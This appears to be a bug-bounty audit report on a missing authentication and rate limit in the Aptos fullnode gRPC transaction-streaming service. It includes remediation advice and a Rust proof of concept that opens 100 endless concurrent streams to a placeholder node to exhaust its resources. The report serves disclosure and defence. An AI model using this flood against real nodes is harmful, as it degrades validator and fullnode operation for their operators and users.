# Audit Report

## Title
Resource Exhaustion via Unauthenticated gRPC Streaming in FullnodeDataService

## Summary
The `FullnodeDataServer` gRPC service lacks authentication, rate limiting, and connection limits, allowing unprivileged attackers to establish unlimited concurrent connections and stream transaction data continuously. This can lead to resource exhaustion (CPU, memory, network bandwidth) and validator/fullnode performance degradation.

## Finding Description

The `FullnodeDataService` exposed via gRPC at `aptos.internal.fullnode.v1.FullnodeData` has no authentication or rate limiting mechanisms. [1](#0-0) 

The server is instantiated without any authentication interceptor, only compression settings are configured. Each incoming connection spawns a new tokio task that processes and streams transactions: [2](#0-1) 

While the similar `indexer-grpc-data-service` component includes deprecated `whitelisted_auth_tokens` configuration for authentication: [3](#0-2) 

The fullnode service has no equivalent authentication configuration: [4](#0-3) 

**Attack Vector:**
1. Attacker discovers a fullnode with `indexer_grpc.enabled: true` exposed on the network
2. Attacker spawns multiple concurrent gRPC connections to `GetTransactionsFromNode`
3. Each connection spawns a tokio task and holds resources (channels, database cursors)
4. No connection limit, authentication, or rate limiting prevents this
5. Node resources (CPU, memory, network) become exhausted
6. If enabled on a validator node, this impacts consensus participation and block production

**Invariant Violation:** This breaks **Resource Limits** (Invariant #9): "All operations must respect gas, storage, and computational limits." The service allows unlimited resource consumption without any limits.

## Impact Explanation

**High Severity** per Aptos Bug Bounty criteria: "Validator node slowdowns"

While the service defaults to disabled, it can be enabled on any node type including validators: [5](#0-4) 

The default binding address is `0.0.0.0:50051` (all interfaces), making accidental public exposure more likely. If enabled on a validator node and exposed to the network, an attacker can cause performance degradation affecting consensus participation.

The REST API provides similar transaction data but includes rate limiting ("100 requests per minute by default" per documentation), demonstrating that read endpoints should have resource controls even for public data.

## Likelihood Explanation

**Medium Likelihood:**
- Service is disabled by default (`enabled: false`)
- Operators must explicitly enable it
- However, the default bind address (`0.0.0.0`) makes exposure easier if enabled
- No warning in configuration about security implications
- Named "internal" but lacks enforcement
- Documentation shows usage without mentioning security considerations [6](#0-5) 

## Recommendation

1. **Add authentication support** similar to the data service:
   - Add `whitelisted_auth_tokens` or similar authentication config to `IndexerGrpcConfig`
   - Implement a tonic interceptor that validates authentication tokens
   - Use `FullnodeDataServer::with_interceptor()` to add the interceptor before serving

2. **Add rate limiting:**
   - Implement connection limits (e.g., max concurrent connections)
   - Add per-client rate limiting based on IP or auth token
   - Add request rate limiting (transactions per second per client)

3. **Change default bind address:**
   - Default to `127.0.0.1:50051` instead of `0.0.0.0:50051`
   - Require explicit configuration to bind to all interfaces

4. **Add security documentation:**
   - Document that this service should not be exposed to untrusted networks
   - Recommend network-level access controls (firewall, VPN)
   - Add warnings in configuration comments

## Proof of Concept

```rust
// Rust PoC demonstrating resource exhaustion attack
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Spawn 100 concurrent connections
    let mut handles = vec![];
    
    for i in 0..100 {
        let handle = tokio::spawn(async move {
            // Connect to vulnerable fullnode
            let mut client = FullnodeDataClient::connect("http://target-node:50051")
                .await
                .expect("Failed to connect");
            
            // Stream transactions continuously
            let request = GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: None, // Stream forever
            };
            
            let mut stream = client
                .get_transactions_from_node(request)
                .await
                .expect("Failed to start stream")
                .into_inner();
            
            // Consume stream slowly to maintain connection
            while let Some(_) = stream.message().await.expect("Stream error") {
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }
        });
        handles.push(handle);
    }
    
    // Wait for all connections (will run indefinitely)
    futures::future::join_all(handles).await;
    Ok(())
}
```

**Notes:**
- The surveillance aspect mentioned in the original question (accessing transaction data) is NOT a vulnerabilityâ€”Aptos blockchain data is public by design, similar to Bitcoin and Ethereum
- The REST API also provides unauthenticated access to transaction data, confirming this is intentional
- The actual vulnerability is resource exhaustion through unlimited connections, not data access

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L108-111)
```rust
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-117)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L58-63)
```rust
    /// Deprecated: a list of auth tokens that are allowed to access the service.
    #[serde(default)]
    pub whitelisted_auth_tokens: Vec<String>,
    /// Deprecated: if set, don't check for auth tokens.
    #[serde(default)]
    pub disable_auth_check: bool,
```

**File:** config/src/config/indexer_grpc_config.rs (L31-59)
```rust
#[derive(Clone, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```

**File:** config/src/config/indexer_grpc_config.rs (L85-100)
```rust
impl Default for IndexerGrpcConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            use_data_service_interface: false,
            address: SocketAddr::V4(SocketAddrV4::new(
                Ipv4Addr::new(0, 0, 0, 0),
                DEFAULT_GRPC_STREAM_PORT,
            )),
            processor_task_count: None,
            processor_batch_size: DEFAULT_PROCESSOR_BATCH_SIZE,
            output_batch_size: DEFAULT_OUTPUT_BATCH_SIZE,
            transaction_channel_size: DEFAULT_TRANSACTION_CHANNEL_SIZE,
            max_transaction_filter_size_bytes: DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES,
        }
    }
```

**File:** ecosystem/indexer-grpc/README.md (L43-54)
```markdown
* Enable the indexer GRPC by adding the following configs to the autogenerated node config: `test_indexer_grpc/0/node.yaml`:
  * ```
    storage:
      enable_indexer: true
    
    indexer_grpc:
      enabled: true
      address: 0.0.0.0:50051
      processor_task_count: 10
      processor_batch_size: 100
      output_batch_size: 100```
* Run the fullnode again, with updated config: `cargo run -p aptos-node -- --test --test-dir test_indexer_grpc`
```
